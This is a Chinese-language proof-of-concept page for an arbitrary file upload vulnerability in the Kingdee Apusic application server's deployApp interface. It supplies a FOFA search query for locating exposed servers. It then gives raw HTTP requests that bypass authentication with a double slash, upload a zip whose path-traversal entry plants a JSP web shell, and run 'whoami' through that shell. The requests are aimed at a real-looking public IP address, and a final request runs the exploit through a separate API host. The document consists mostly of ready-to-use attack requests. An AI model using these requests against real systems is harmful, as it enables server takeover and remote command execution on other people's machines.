# 金蝶Kingdee天燕Apusic应用服务器 deployApp 任意文件上传漏洞

    ## fofa

```
title="Apusic应用服务器"
```

## poc

金蝶Apusic应用服务器是国内第一个遵循J2EE标准的自有知识产权的纯Java应用服务器。金蝶Apusic应用服务器 deployApp 接口存在任意文件上传漏洞，攻击者可通过双斜杠绕过鉴权并上传恶意压缩包接管服务器权限xxxxxxxxxx

```
POST /admin//protect/application/deployApp HTTP/1.1
Host: 219.145.189.3:6080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryd9acIBdVuqKWDJbd
Accept-Encoding: gzip
Content-Length: 1653

------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="appName"

111
------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="deployInServer"

false
------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="clientFile"; filename="evil.zip"
Content-Type: application/x-zip-compressed

PK../../../../applications/default/public_html/shell2.jspPK
------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="archivePath"


------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="baseContext"


------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="startType"

auto
------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="loadon"


------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="virtualHost"


------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="allowHosts"


------WebKitFormBoundaryd9acIBdVuqKWDJbd
Content-Disposition: form-data; name="denyHosts"


------WebKitFormBoundaryd9acIBdVuqKWDJbd--
```



```
GET /shell2.jsp?pwd=admin&cmd=whoami HTTP/1.1
Host: 219.145.189.3:6080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip


```







## Exp

```
POST /api/v1/debugExp HTTP/1.1
Content-Type: application/json;charset=UTF-8
Authorization: Basic dXNlcjpwYXNz
host: 82.156.29.211:8365
Connection: close
Content-Length: 98

{"hostinfo":"http://219.145.189.3:6080","vulfile":"CVD-2023-1207.go","expparams":{"cmd":"whoami"}}
``
```
